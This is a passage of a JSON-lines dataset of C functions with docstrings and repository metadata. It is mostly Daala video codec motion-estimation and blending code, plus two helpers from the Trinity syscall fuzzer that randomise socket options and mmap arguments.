00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*\n * We do this if for eg, we've ended up being passed\n * an fd that isn't a socket (ie, triplet==NULL).\n * It can also happen if we land on an sso func that\n * isn't implemented for a particular family yet.\n */\n", "func_signal": "static void do_random_sso(struct sockopt *so, struct socket_triplet *triplet)", "code": "{\n\tunsigned int i;\n\tconst struct netproto *proto;\n\nretry:\n\tswitch (rnd() % 4) {\n\tcase 0:\t/* do a random protocol, even if it doesn't match this socket. */\n\t\ti = rnd() % PF_MAX;\n\t\tproto = net_protocols[i].proto;\n\t\tif (proto != NULL) {\n\t\t\tif (proto->setsockopt != NULL) {\n\t\t\t\tproto->setsockopt(so, triplet);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tgoto retry;\n\n\tcase 1:\t/* do a random IP protocol, even if it doesn't match this socket. */\n\t\tproto = net_protocols[PF_INET].proto;\n\t\tproto->setsockopt(so, triplet);\n\t\tbreak;\n\n\tcase 2:\t/* Last resort: Generic socket options. */\n\t\tsocket_setsockopt(so, triplet);\n\t\tbreak;\n\n\tcase 3:\t/* completely random operation. */\n\t\tso->level = rnd();\n\t\tso->optname = RAND_BYTE();\n\t\tbreak;\n\t}\n}", "path": "trinity/syscalls/setsockopt.c", "commit_date": "2019-07-22 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/* used in several sanitise_* functions. */\n", "func_signal": "struct map * common_set_mmap_ptr_len(void)", "code": "{\n\tstruct syscallrecord *rec;\n\tstruct map *map;\n\tstruct childdata *child = this_child();\n\n\trec = &child->syscall;\n\tmap = (struct map *) rec->a1;\n\tif (map == NULL) {\n\t\trec->a1 = 0;\n\t\trec->a2 = 0;\n\t\treturn NULL;\n\t}\n\n\trec->a1 = (unsigned long) map->ptr;\n\trec->a2 = rnd() % map->size;\n\trec->a2 &= PAGE_MASK;\n\n\treturn map;\n}", "path": "trinity/mm/maps.c", "commit_date": "2019-12-26 00:00:00", "repo_name": "kernelslacker/trinity", "stars": 847, "license": "other", "language": "c", "size": 5282}
{"docstring": "/*Swap the two nodes on the decimation heap at indices p and q.*/\n", "func_signal": "static void od_mv_dec_heap_swap(od_mv_node **heap, int p, int q)", "code": "{\n  od_mv_node *t;\n  heap[p]->heapi = q;\n  heap[q]->heapi = p;\n  t = heap[p];\n  heap[p] = heap[q];\n  heap[q] = t;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Gets the change in SAD for the blocks affected by the given DP node, using\n   the current state of the grid.*/\n", "func_signal": "static int32_t od_mv_dp_get_sad_change(od_mv_est_ctx *est,\n od_mv_dp_node *dp, int32_t block_sads[OD_DP_NBLOCKS_MAX])", "code": "{\n  int bi;\n  int32_t dd;\n  dd = 0;\n  for (bi = 0; bi < dp->nblocks; bi++) {\n    od_mv_node *block;\n    block = dp->blocks[bi];\n    block_sads[bi] = od_mv_est_block_sad(est, block);\n    OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_DEBUG,\n     \"SAD change for block (%i, %i) [%ix%i]: %i - %i = %i\", block->vx,\n     block->vy, 1 << (block->log_mvb_sz + OD_LOG_MVBSIZE_MIN),\n     1 << (block->log_mvb_sz + OD_LOG_MVBSIZE_MIN),\n     block_sads[bi], block->sad, block_sads[bi] - block->sad));\n    dd += block_sads[bi] - block->sad;\n  }\n  return dd;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Finds which blocks to the left of the first node in a DP row are affected by\n   that MV.*/\n", "func_signal": "static void od_mv_dp_first_row_block_setup(od_mv_est_ctx *est,\n od_mv_dp_node *dp, int vx, int vy)", "code": "{\n  int nblocks;\n  nblocks = 0;\n  if (vx > 0) {\n    od_state *state;\n    int nvmvbs;\n    int level;\n    int log_mvb_sz;\n    int mvb_sz;\n    state = &est->enc->state;\n    nvmvbs = state->nvmvbs;\n    level = OD_MC_LEVEL[vy & OD_MVB_MASK][vx & OD_MVB_MASK];\n    log_mvb_sz = (OD_MC_LEVEL_MAX - level) >> 1;\n    mvb_sz = 1 << log_mvb_sz;\n    /*DP chains begin either at the left of the frame or after a gap.\n      vx > 0, so this is the first vertex after a gap.\n      It's impossible to start a DP chain on an even level vertex\n       after a gap as every even vertex has an odd vertex as parent\n       left of it.\n      Therefore this vertex is an odd level.\n      This odd level vertex has no left even child, else it would not be\n       the first vertex after a gap.\n      There can be no split without that missing even child acting as\n       parent for the odd vertex the next level down.\n      Thus any block UL or LL of this vertex is unsplit.\n      We need only check that the blocks exist (not off top or bottom\n       of the frame.)*/\n    if (vy >= mvb_sz) {\n      OD_ASSERT(mvb_sz == 1\n       || !state->mv_grid[vy - (mvb_sz >> 1)][vx - (mvb_sz >> 1)].valid);\n      dp->blocks[nblocks++] = est->mvs[vy - mvb_sz] + vx - mvb_sz;\n      OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n    }\n    if (vy <= nvmvbs - mvb_sz) {\n      OD_ASSERT(mvb_sz == 1\n       || !state->mv_grid[vy + (mvb_sz >> 1)][vx - (mvb_sz >> 1)].valid);\n      dp->blocks[nblocks++] = est->mvs[vy] + vx - mvb_sz;\n      OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n    }\n  }\n  dp->nblocks = nblocks;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Computes the Sum of Absolute Differences: slow path.*/\n", "func_signal": "int32_t od_mc_compute_sad8_c(const unsigned char *src, int systride,\n const unsigned char *ref, int dystride, int w, int h)", "code": "{\n  int i;\n  int j;\n  int ret;\n  ret = 0;\n  for (j = 0; j < h; j++) {\n    for (i = 0; i < w; i++) {\n      ret += abs(ref[i] - src[i]);\n    }\n    src += systride;\n    ref += dystride;\n  }\n  return ret;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Finds which blocks to the right of the last node in a DP row are affected by\n   that MV.\n  The caller special-cases the case where there are no following blocks, so we\n   don't need to check if we're on the edge of the frame (it has already done\n   so).*/\n", "func_signal": "static void od_mv_dp_last_row_block_setup(od_mv_est_ctx *est,\n od_mv_dp_node *dp, int vx, int vy)", "code": "{\n  od_state *state;\n  int nvmvbs;\n  int level;\n  int log_mvb_sz;\n  int mvb_sz;\n  int nblocks;\n  state = &est->enc->state;\n  nvmvbs = state->nvmvbs;\n  level = OD_MC_LEVEL[vy & OD_MVB_MASK][vx & OD_MVB_MASK];\n  log_mvb_sz = (OD_MC_LEVEL_MAX - level) >> 1;\n  mvb_sz = 1 << log_mvb_sz;\n  nblocks = 0;\n  /*The logic here is the same as in first_row, but at the end of a\n     chain.\n    The conclusion is the same; this is an odd vertex and the blocks\n     to the right cannot be split.*/\n  if (vy >= mvb_sz) {\n    OD_ASSERT(mvb_sz == 1\n     || !state->mv_grid[vy - (mvb_sz >> 1)][vx + (mvb_sz >> 1)].valid);\n    dp->blocks[nblocks++] = est->mvs[vy - mvb_sz] + vx;\n    OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n  }\n\n  if (vy <= nvmvbs - mvb_sz) {\n    OD_ASSERT(mvb_sz == 1\n     || !state->mv_grid[vy + (mvb_sz >> 1)][vx + (mvb_sz >> 1)].valid);\n    dp->blocks[nblocks++] = est->mvs[vy] + vx;\n    OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n  }\n  dp->nblocks = nblocks;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Mark a motion vector examined.*/\n", "func_signal": "static void od_mv_est_set_hit(od_mv_est_ctx *est, int mvx, int mvy)", "code": "{\n  est->hit_cache[mvy + OD_MC_SEARCH_RANGE*2][mvx + OD_MC_SEARCH_RANGE*2] =\n   (unsigned char)est->hit_bit;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Perform normal bilinear blending.*/\n", "func_signal": "void od_mc_blend_full8_sse2(unsigned char *_dst,int _dystride,\n const unsigned char *_src[4],int _log_xblk_sz,int _log_yblk_sz)", "code": "{\n  static const od_mc_blend_full8_fixed_func\n   VTBL[OD_LOG_MVBSIZE_MAX + 1][OD_LOG_MVBSIZE_MAX + 1]={\n    {\n      od_mc_blend_full8_1x1,od_mc_blend_full8_1x2,\n      od_mc_blend_full8_1x4,od_mc_blend_full8_1x8,\n      od_mc_blend_full8_1x16\n    },\n    {\n      od_mc_blend_full8_2x1,od_mc_blend_full8_2x2,\n      od_mc_blend_full8_2x4,od_mc_blend_full8_2x8,\n      od_mc_blend_full8_2x16\n    },\n    {\n      od_mc_blend_full8_4x1,od_mc_blend_full8_4x2,\n      od_mc_blend_full8_4x4,od_mc_blend_full8_4x8,\n      od_mc_blend_full8_4x16\n    },\n    {\n      od_mc_blend_full8_8x1,od_mc_blend_full8_8x2,\n      od_mc_blend_full8_8x4,od_mc_blend_full8_8x8,\n      od_mc_blend_full8_8x16\n    },\n    {\n      od_mc_blend_full8_16x1,od_mc_blend_full8_16x2,\n      od_mc_blend_full8_16x4,od_mc_blend_full8_16x8,\n      od_mc_blend_full8_16x16\n    },\n    /*These NULLs are placeholders because we do not currently call this\n       function for these sizes.\n      If you need one of them, add another OD_MC_BLEND_FULL8_C() line above.*/\n    {\n      NULL, NULL, NULL, NULL, NULL, od_mc_blend_full8_32x32\n    },\n    {\n      NULL, NULL, NULL, NULL, NULL, NULL, od_mc_blend_full8_64x64\n    }\n  };\n  (*VTBL[_log_xblk_sz][_log_yblk_sz])(_dst,_dystride,_src);\n#if defined(OD_CHECKASM)\n  od_mc_blend_full8_check(_dst,_dystride,_src,_log_xblk_sz,_log_yblk_sz);\n  /*fprintf(stderr,\"od_mc_blend_full8 %ix%i check finished.\\n\",\n   1<<_log_xblk_sz,1<<_log_yblk_sz);*/\n#endif\n}", "path": "daala/src/x86/sse2mc.c", "commit_date": "2016-01-02 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Sets up a second set of image pointers based on the given split state to\n   properly shift weight from one image to another.*/\n", "func_signal": "static void od_mc_setup_split_ptrs(const unsigned char *_drc[4],\n const unsigned char *_src[4],int _c,int _s)", "code": "{\n  int j;\n  int k;\n  _drc[_c]=_src[_c];\n  j=(_c+(_s&1))&3;\n  k=(_c+1)&3;\n  _drc[k]=_src[j];\n  j=(_c+(_s&2)+((_s&2)>>1))&3;\n  k=(_c+3)&3;\n  _drc[k]=_src[j];\n  k=_c^2;\n  _drc[k]=_src[k];\n}", "path": "daala/src/x86/sse2mc.c", "commit_date": "2016-01-02 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Sets the dd and dr values of the given node, restoring the heap structure\n   afterwards.*/\n", "func_signal": "static void od_mv_dec_update(od_mv_est_ctx *est, od_mv_node *node,\n int dd, int dr)", "code": "{\n  int diff;\n  diff = od_mv_dddr_cmp(dd, dr, node->dd, node->dr);\n  node->dd = dd;\n  node->dr = dr;\n  if (node->heapi >= 0) {\n    if (diff <= 0) od_mv_dec_heap_up(est, node->heapi);\n    else od_mv_dec_heap_down(est, node->heapi);\n  }\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Column refinement.*/\n", "func_signal": "static void od_mv_dp_col_init(od_mv_est_ctx *est,\n od_mv_dp_node *dp, int vx, int vy, od_mv_dp_node *prev_dp)", "code": "{\n  od_state *state;\n  int nhmvbs;\n  int nvmvbs;\n  int level;\n  int pred_hist;\n  int npred;\n  int nchangeable;\n  int pi;\n  state = &est->enc->state;\n  dp->mv = est->mvs[vy] + vx;\n  dp->mvg = state->mv_grid[vy] + vx;\n  if (dp->mvg->ref == OD_FRAME_NEXT) {\n    dp->original_mv[0] = dp->mvg->mv1[0];\n    dp->original_mv[1] = dp->mvg->mv1[1];\n  }\n  else {\n    dp->original_mv[0] = dp->mvg->mv[0];\n    dp->original_mv[1] = dp->mvg->mv[1];\n  }\n  dp->original_mv_rate = dp->mv->mv_rate;\n  nhmvbs = state->nhmvbs;\n  nvmvbs = state->nvmvbs;\n  /*Get the list of MVs we help predict.*/\n  level = OD_MC_LEVEL[vy & OD_MVB_MASK][vx & OD_MVB_MASK];\n  OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_DEBUG,\n   \"Initializing node (%i, %i) [%i, %i] at level %i:\",\n   vx, vy, vx << OD_LOG_MVBSIZE_MIN, vy << OD_LOG_MVBSIZE_MIN, level));\n  npred = nchangeable = 0;\n  for (pi = 0; pi < OD_NPREDICTED[level]; pi++) {\n    int px;\n    int py;\n    px = vx + OD_COL_PREDICTED[level][pi][0];\n    if (px < 0 || px > nhmvbs) continue;\n    py = vy + OD_COL_PREDICTED[level][pi][1];\n    if (py < 0 || py > nvmvbs) continue;\n    if (state->mv_grid[py][px].valid) {\n      OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_DEBUG,\n       \"Adding (%i, %i) as a PREDICTED MV.\", px, py));\n      dp->predicted_mvgs[npred] = state->mv_grid[py] + px;\n      dp->predicted_mvs[npred] = est->mvs[py] + px;\n      if (pi < OD_NCOL_PRED_CHANGEABLE[level]) {\n        OD_LOG((OD_LOG_MOTION_ESTIMATION,\n         OD_LOG_DEBUG, \"It is CHANGEABLE.\"));\n        dp->original_mv_rates[npred] = est->mvs[py][px].mv_rate;\n        nchangeable++;\n      }\n      npred++;\n    }\n  }\n  dp->npredicted = npred;\n  dp->npred_changeable = nchangeable;\n  /*Now, figure out the earliest DP node that influences our own prediction,\n     or that of one of the other MVs we predict.*/\n  pred_hist = OD_COL_PRED_HIST_SIZE[level];\n  if (prev_dp != NULL && prev_dp->mv->vy >= vy - pred_hist) {\n    od_mv_dp_node *dp_pred;\n    for (dp_pred = prev_dp; dp_pred->mv->vy > vy - pred_hist\n     && dp_pred->states[0].prevsi >= 0; dp_pred--);\n    if (dp_pred->mv->vy < vy - pred_hist) dp_pred++;\n    dp->min_predictor_node = dp_pred;\n    OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_DEBUG,\n     \"State will be restored back to (%i, %i).\",\n     dp_pred->mv->vx, dp_pred->mv->vy));\n  }\n  else dp->min_predictor_node = NULL;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Finds which blocks above each subsequent node in a DP row are affected by\n   that MV or the previous one.*/\n", "func_signal": "static void od_mv_dp_prev_col_block_setup(od_mv_est_ctx *est,\n od_mv_dp_node *dp, int vx, int vy)", "code": "{\n  od_state *state;\n  int nhmvbs;\n  int level;\n  int prev_level;\n  int log_mvb_sz;\n  int prev_log_mvb_sz;\n  int mvb_sz;\n  int nblocks;\n  state = &est->enc->state;\n  nhmvbs = state->nhmvbs;\n  level = OD_MC_LEVEL[vy & OD_MVB_MASK][vx & OD_MVB_MASK];\n  log_mvb_sz = (OD_MC_LEVEL_MAX - level) >> 1;\n  mvb_sz = 1 << log_mvb_sz;\n  prev_level = OD_MC_LEVEL[(vy - mvb_sz) & OD_MVB_MASK][vx & OD_MVB_MASK];\n  prev_log_mvb_sz = (OD_MC_LEVEL_MAX - prev_level) >> 1;\n  nblocks = 0;\n  if (level >= OD_MC_LEVEL_MAX - 1) {\n    /*If the current MV is at the bottom of the hierarchy, then we always want\n       one block up-left and up-right from it.*/\n    if (vx > 0) {\n      dp->blocks[nblocks++] = est->mvs[vy - 1] + vx - 1;\n      OD_ASSERT(dp->blocks[nblocks - 1]->log_mvb_sz == 0);\n      /*But if the _previous_ node was not, then\n         a) level must be OD_MC_LEVEL_MAX, and\n         b) If the MV up-left from us is not present, then the previous MV also\n          affects one more block to the left of us.*/\n      if (prev_log_mvb_sz > 0 && !state->mv_grid[vy - 1][vx - 1].valid) {\n        dp->blocks[nblocks++] = est->mvs[vy - 1] + vx - 2;\n        OD_ASSERT(dp->blocks[nblocks - 1]->log_mvb_sz == 0);\n      }\n    }\n    if (vx < nhmvbs) {\n      dp->blocks[nblocks++] = est->mvs[vy - 1] + vx;\n      OD_ASSERT(dp->blocks[nblocks - 1]->log_mvb_sz == 0);\n      /*The same case for a missing up-right MV.*/\n      if (prev_log_mvb_sz > 0 && !state->mv_grid[vy - 1][vx + 1].valid) {\n        dp->blocks[nblocks++] = est->mvs[vy - 1] + vx + 1;\n        OD_ASSERT(dp->blocks[nblocks - 1]->log_mvb_sz == 0);\n      }\n    }\n  }\n  else {\n    int half_mvb_sz;\n    int mvb_off;\n    half_mvb_sz = mvb_sz >> 1;\n    if (vx >= mvb_sz) {\n      /*Figure out if the up-left block has been split at all.*/\n      if (state->mv_grid[vy - half_mvb_sz][vx - half_mvb_sz].valid) {\n        /*It has, now figure out how far down.*/\n        mvb_off = half_mvb_sz;\n        while (mvb_off > 1\n         && state->mv_grid[vy - (mvb_off >> 1)][vx - (mvb_off >> 1)].valid) {\n          mvb_off >>= 1;\n        }\n        dp->blocks[nblocks++] = est->mvs[vy - mvb_off] + vx - mvb_off;\n        OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n        /*If we were only partially split at this level, then this MV might\n           be used for an extra block to the left.*/\n        if (!state->mv_grid[vy][vx - mvb_off].valid) {\n          dp->blocks[nblocks++] = est->mvs[vy - mvb_off] + vx - (mvb_off << 1);\n          OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n        }\n        /*Or for an extra block above.*/\n        if (!state->mv_grid[vy - mvb_off][vx].valid) {\n          dp->blocks[nblocks++] = est->mvs[vy - (mvb_off << 1)] + vx - mvb_off;\n          OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n          /*And if so, if the _previous_ MV might have affected an extra block\n             to the left of it.*/\n          if (!state->mv_grid[vy - (mvb_off << 1)][vx - mvb_off].valid) {\n            dp->blocks[nblocks++] =\n             est->mvs[vy - (mvb_off << 1)] + vx - (mvb_off << 1);\n            OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n          }\n        }\n      }\n      else {\n        /*If it has not been split, then this MV affects exactly one block on\n           this side.*/\n        dp->blocks[nblocks++] = est->mvs[vy - mvb_sz] + vx - mvb_sz;\n        OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n        /*But if the previous node was at a higher level of the hierarchy, then\n           a) level must be even, and\n           b) If the MV up-left from us is not present, then the previous MV\n            also affects one more block to the left of us.*/\n        if (prev_log_mvb_sz > log_mvb_sz\n         && !state->mv_grid[vy - mvb_sz][vx - mvb_sz].valid) {\n          dp->blocks[nblocks++] = est->mvs[vy - mvb_sz] + vx - (mvb_sz << 1);\n          OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n        }\n      }\n    }\n    if (vx <= nhmvbs - mvb_sz) {\n      /*Figure out if the up-right block has been split at all.*/\n      if (state->mv_grid[vy - half_mvb_sz][vx + half_mvb_sz].valid) {\n        /*It has, now figure out how far down.*/\n        mvb_off = half_mvb_sz;\n        while (mvb_off > 1\n         && state->mv_grid[vy - (mvb_off >> 1)][vx + (mvb_off >> 1)].valid) {\n          mvb_off >>= 1;\n        }\n        dp->blocks[nblocks++] = est->mvs[vy - mvb_off] + vx;\n        OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n        /*If we were only partially split at this level, then this MV might\n           be used for an extra block to the right.*/\n        if (!state->mv_grid[vy][vx + mvb_off].valid) {\n          dp->blocks[nblocks++] = est->mvs[vy - mvb_off] + vx + mvb_off;\n          OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n        }\n        /*Or for an extra block above.*/\n        if (!state->mv_grid[vy - mvb_off][vx].valid) {\n          dp->blocks[nblocks++] = est->mvs[vy - (mvb_off << 1)] + vx;\n          OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n          /*And if so, if the _previous_ MV might have affected an extra block\n             to the right of it.*/\n          if (!state->mv_grid[vy - (mvb_off << 1)][vx + mvb_off].valid) {\n            dp->blocks[nblocks++] =\n             est->mvs[vy - (mvb_off << 1)] + vx + mvb_off;\n            OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_off);\n          }\n        }\n      }\n      else {\n        /*If it has not been split, then this MV affects exactly one block on\n           this side.*/\n        dp->blocks[nblocks++] = est->mvs[vy - mvb_sz] + vx;\n        OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n        /*But if the previous node was at a higher level of the hierarchy, then\n           a) level must be even, and\n           b) If the MV up-right from us is not present, then the previous MV\n            also affects one more block to the right of us.*/\n        if (prev_log_mvb_sz > log_mvb_sz\n         && !state->mv_grid[vy - mvb_sz][vx + mvb_sz].valid) {\n          dp->blocks[nblocks++] = est->mvs[vy - mvb_sz] + vx + mvb_sz;\n          OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n        }\n      }\n    }\n  }\n  dp->nblocks = nblocks;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Stores the halfpel MVs for use by EPZS^2 in the next frame before sub-pel\n   refinement.*/\n", "func_signal": "void od_mv_est_update_bma_mvs(od_mv_est_ctx *est)", "code": "{\n  od_state *state;\n  int nhmvbs;\n  int nvmvbs;\n  int vx;\n  int vy;\n  state = &est->enc->state;\n  nhmvbs = state->nhmvbs;\n  nvmvbs = state->nvmvbs;\n  for (vy = 0; vy <= nvmvbs; vy++) {\n    for (vx = 0; vx <= nhmvbs; vx++) {\n      od_mv_grid_pt *mvg;\n      od_mv_node *mv;\n      mvg = state->mv_grid[vy] + vx;\n      OD_ASSERT(mvg->ref == OD_FRAME_GOLD || mvg->ref == OD_FRAME_PREV);\n      if (!mvg->valid) continue;\n      mv = est->mvs[vy] + vx;\n      mv->bma_mvs[0][mvg->ref][0] = OD_DIV_POW2_RE(mvg->mv[0], 2);\n      mv->bma_mvs[0][mvg->ref][1] = OD_DIV_POW2_RE(mvg->mv[1], 2);\n    }\n  }\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Finds which blocks below the last node in a DP column are affected by that\n   MV.\n  The caller special-cases the case where there are no following blocks, so we\n   don't need to check if we're on the edge of the frame (it has already done\n   so).*/\n", "func_signal": "static void od_mv_dp_last_col_block_setup(od_mv_est_ctx *est,\n od_mv_dp_node *dp, int vx, int vy)", "code": "{\n  od_state *state;\n  int nhmvbs;\n  int level;\n  int log_mvb_sz;\n  int mvb_sz;\n  int nblocks;\n  state = &est->enc->state;\n  nhmvbs = state->nhmvbs;\n  level = OD_MC_LEVEL[vy & OD_MVB_MASK][vx & OD_MVB_MASK];\n  log_mvb_sz = (OD_MC_LEVEL_MAX - level) >> 1;\n  mvb_sz = 1 << log_mvb_sz;\n  nblocks = 0;\n  /*The logic here is the same as in first_col, but at the end of a\n     chain.\n    The conclusion is the same; this is an odd vertex and the blocks\n     below cannot be split.*/\n  if (vx >= mvb_sz) {\n    OD_ASSERT(mvb_sz == 1\n     || !state->mv_grid[vy + (mvb_sz >> 1)][vx - (mvb_sz >> 1)].valid);\n    dp->blocks[nblocks++] = est->mvs[vy] + vx - mvb_sz;\n    OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n  }\n  if (vx <= nhmvbs - mvb_sz) {\n    OD_ASSERT(mvb_sz == 1\n     || !state->mv_grid[vy + (mvb_sz >> 1)][vx + (mvb_sz >> 1)].valid);\n    dp->blocks[nblocks++] = est->mvs[vy] + vx;\n    OD_ASSERT(1 << dp->blocks[nblocks - 1]->log_mvb_sz == mvb_sz);\n  }\n  dp->nblocks = nblocks;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Checks to make sure our current mv_rate and sad values are correct.\n  This is used for debugging only.*/\n", "func_signal": "void od_mv_est_check_rd_state(od_mv_est_ctx *est, int mv_res)", "code": "{\n  od_state *state;\n  int nhmvbs;\n  int nvmvbs;\n  int vx;\n  int vy;\n# if !defined(OD_ENABLE_ASSERTIONS)\n  if (!od_logging_active(OD_LOG_MOTION_ESTIMATION, OD_LOG_WARN)) return;\n# endif\n  state = &est->enc->state;\n  nhmvbs = state->nhmvbs;\n  nvmvbs = state->nvmvbs;\n  for (vy = 0; vy < nvmvbs; vy += OD_MVB_DELTA0) {\n    for (vx = 0; vx < nhmvbs; vx += OD_MVB_DELTA0) {\n      od_mv_est_check_rd_block_state(est, vx, vy, OD_LOG_MVB_DELTA0);\n    }\n  }\n  for (vy = 0; vy < nvmvbs; vy++) {\n    for (vx = 0; vx < nhmvbs; vx++) {\n      od_mv_grid_pt *mvg;\n      od_mv_node *mv;\n      int mv_rate;\n      int level;\n      int mvb_sz;\n      mvg = state->mv_grid[vy] + vx;\n      if (!mvg->valid) continue;\n      level = OD_MC_LEVEL[vy & OD_MVB_MASK][vx & OD_MVB_MASK];\n      mvb_sz = 1 << ((OD_MC_LEVEL_MAX - level) >> 1);\n      if (level & 1) {\n        OD_ASSERT(state->mv_grid[vy - mvb_sz][vx - mvb_sz].valid\n         && state->mv_grid[vy - mvb_sz][vx + mvb_sz].valid\n         && state->mv_grid[vy + mvb_sz][vx - mvb_sz].valid\n         && state->mv_grid[vy + mvb_sz][vx + mvb_sz].valid);\n      }\n      else {\n        OD_ASSERT((vy - mvb_sz < 0 || state->mv_grid[vy - mvb_sz][vx].valid)\n         && (vx - mvb_sz < 0 || state->mv_grid[vy][vx - mvb_sz].valid)\n         && (vy + mvb_sz > nvmvbs || state->mv_grid[vy + mvb_sz][vx].valid)\n         && (vx + mvb_sz > nhmvbs || state->mv_grid[vy][vx + mvb_sz].valid));\n      }\n      mv = est->mvs[vy] + vx;\n      mv_rate = od_mv_est_bits(est, vx, vy, mv_res);\n      if (mv_rate != mv->mv_rate) {\n        OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_WARN,\n         \"Failure at node (%i, %i): mv_rate should be %i (is %i)\",\n         vx, vy, mv_rate, mv->mv_rate));\n        OD_MV_EST_LOG_PRED(est, vx, vy, mv_res);\n        if (mvg->ref == OD_FRAME_NEXT) {\n          OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_WARN,\n           \"MV was: (%i, %i)@%i\", mvg->mv1[0] >> mv_res,\n           mvg->mv1[1] >> mv_res, mvg->ref));\n        }\n        else {\n          OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_WARN,\n           \"MV was: (%i, %i)@%i\", mvg->mv[0] >> mv_res,\n           mvg->mv[1] >> mv_res, mvg->ref));\n        }\n        OD_ASSERT(mv_rate == mv->mv_rate);\n      }\n    }\n  }\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Restore the heap structure at the given index by moving it up the heap.*/\n", "func_signal": "static void od_mv_dec_heap_up(od_mv_est_ctx *est, int heapi)", "code": "{\n  od_mv_node **heap;\n  int p;\n  heap = est->dec_heap;\n  p = heapi;\n  while (p > 0) {\n    int q;\n    q = p;\n    p = ((q + 1) >> 1) - 1;\n    if (od_mv_dec_cmp(heap[p], heap[q]) <= 0) break;\n    od_mv_dec_heap_swap(heap, p, q);\n  }\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
